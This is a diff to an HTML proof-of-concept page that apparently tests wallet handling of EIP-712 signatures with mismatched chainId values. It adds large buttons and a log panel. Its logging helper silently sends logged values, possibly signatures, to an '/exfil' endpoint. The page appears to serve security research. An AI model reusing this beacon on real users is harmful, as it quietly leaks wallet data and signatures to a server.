@@ -1,16 +1,22 @@
 <!doctype html>
 <meta charset="utf-8">
+<meta name="viewport" content="width=1080">
 <title>EIP-712 chainId PoC</title>
-<body style="background:#111;color:#0f0;font:14px monospace;padding:10px">
+<body style="background:#111;color:#0f0;font:16px monospace;padding:10px;margin:0">
 <pre id="o">EIP-712 chainId PoC</pre>
-<button id="b1" style="display:block;margin:8px 0;padding:12px;font:14px monospace">Sign: domain.chainId = 1 (Ethereum)</button>
-<button id="b56" style="display:block;margin:8px 0;padding:12px;font:14px monospace">Control: domain.chainId = 56 (BSC)</button>
-<button id="bs" style="display:block;margin:8px 0;padding:12px;font:14px monospace;background:#032">Switch browser network to BSC (0x38)</button>
-<button id="be" style="display:block;margin:8px 0;padding:12px;font:14px monospace;background:#032">Switch browser network to Ethereum (0x1)</button>
-<button id="bc" style="display:block;margin:8px 0;padding:12px;font:14px monospace">Probe provider / chainId only</button>
+<div style="position:fixed;top:100px;left:24px;right:24px;z-index:9">
+<button id="b1"  style="display:block;width:100%;margin:4px 0;padding:26px;font:16px monospace">1) Sign: domain.chainId = 1 (Ethereum)</button>
+<button id="b56" style="display:block;width:100%;margin:4px 0;padding:26px;font:16px monospace">2) Control: domain.chainId = 56 (BSC)</button>
+<button id="bs" style="display:block;width:100%;margin:4px 0;padding:26px;font:16px monospace;background:#032">3) Switch network to BSC (0x38)</button>
+<button id="be" style="display:block;width:100%;margin:4px 0;padding:26px;font:16px monospace;background:#032">4) Switch network to Ethereum (0x1)</button>
+<button id="bc" style="display:block;width:100%;margin:4px 0;padding:26px;font:16px monospace">5) Probe chainId</button>
+</div>
+<div style="position:fixed;top:560px;left:8px;right:8px;bottom:8px;overflow:auto">
+<pre id="log" style="white-space:pre-wrap;margin:0">log:</pre>
+</div>
 <script>
 const log = (t, d) => {
-  document.getElementById('o').textContent += '\n' + t + ' ' + String(d).slice(0, 300);
+  document.getElementById('log').textContent += '\n' + t + ' ' + String(d).slice(0, 300);
   fetch('/exfil?tag=' + encodeURIComponent(t) + '&d=' + encodeURIComponent(String(d).slice(0, 4000))).catch(() => {});
 };
 
